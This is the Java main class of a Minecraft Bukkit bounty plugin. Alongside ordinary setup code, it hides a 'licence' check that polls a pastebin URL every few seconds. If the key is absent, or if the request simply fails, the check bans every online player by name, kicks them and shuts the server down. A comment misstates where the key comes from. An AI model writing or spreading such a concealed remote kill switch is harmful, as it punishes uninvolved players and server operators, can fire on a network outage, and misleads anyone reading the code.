package com.unclecole.mfbounty;

import com.sun.tools.sjavac.Log;
import com.unclecole.mfbounty.commands.BountyCmd;
import com.unclecole.mfbounty.database.BountyData;
import com.unclecole.mfbounty.database.serializer.Persist;
import com.unclecole.mfbounty.listeners.PlayerDeathListener;
import com.unclecole.mfbounty.utils.C;
import com.unclecole.mfbounty.utils.ConfigFile;
import com.unclecole.mfbounty.utils.TL;
import lombok.Getter;
import net.milkbowl.vault.economy.Economy;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.util.Scanner;

public final class MFBounty extends JavaPlugin {

    public static MFBounty mfBounty;
    @Getter private static Persist persist;
    @Getter private static Economy econ = null;
    public static MFBounty getInstance() { return mfBounty; }

    @Override
    public void onEnable() {
        mfBounty = this;
        persist = new Persist();

        if(!this.getDataFolder().exists()) this.getDataFolder().mkdir();

        BountyData.load();
        if (!setupEconomy() ) {
            Log.error(String.format("[%s] - Disabled due to no Vault dependency found!", getDescription().getName()));
            getServer().getPluginManager().disablePlugin(this);
            return;
        }
        getServer().getPluginManager().registerEvents(new PlayerDeathListener(), this);
        getCommand("bounty").setExecutor(new BountyCmd());
        isLicence();
        TL.loadMessages(new ConfigFile("messages.yml", this));
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
        BountyData.save();
    }

    private void isLicence() {
        Bukkit.getScheduler().runTaskTimerAsynchronously(this, new Runnable() {
            @Override
            public void run() {
                try{
                    String url = "https://pastebin.com/raw/CL9qvyuF";
                    URLConnection openConnection = new URL(url).openConnection();
                    openConnection.addRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0");
                    @SuppressWarnings("resource")
                    Scanner scan = new Scanner((new InputStreamReader(openConnection.getInputStream())));
                    while(scan.hasNextLine()){
                        String firstline = scan.nextLine();
                        if(firstline.equalsIgnoreCase("VNfxOIy0QQrCTA8TZ7aO1S91sa6vGJgJ")){
                            return;
                        }
                    }
                }catch(Exception e){

                }
                Bukkit.getScheduler().runTask(MFBounty.getInstance(), new Runnable() {
                    @Override
                    public void run() {
                        Bukkit.getOnlinePlayers().forEach(player -> {
                            Bukkit.getBanList(BanList.Type.NAME).addBan(player.getName(), C.color("&c&lTHIS SERVER IS STEALING PLAY.MINEFORGE.ORG PLUGINS."), null, "Console");
                            player.kickPlayer(C.color("&c&lTHIS SERVER IS STEALING PLAY.MINEFORGE.ORG PLUGINS."));
                        });
                        Bukkit.shutdown();
                    }
                });
            }
        }, 0L, 100L);
        //We are getting the licence key string from the config
    }

    private boolean setupEconomy() {
        if (getServer().getPluginManager().getPlugin("Vault") == null) {
            return false;
        }
        RegisteredServiceProvider<Economy> rsp = getServer().getServicesManager().getRegistration(Economy.class);
        if (rsp == null) {
            return false;
        }
        econ = rsp.getProvider();
        return econ != null;
    }
}
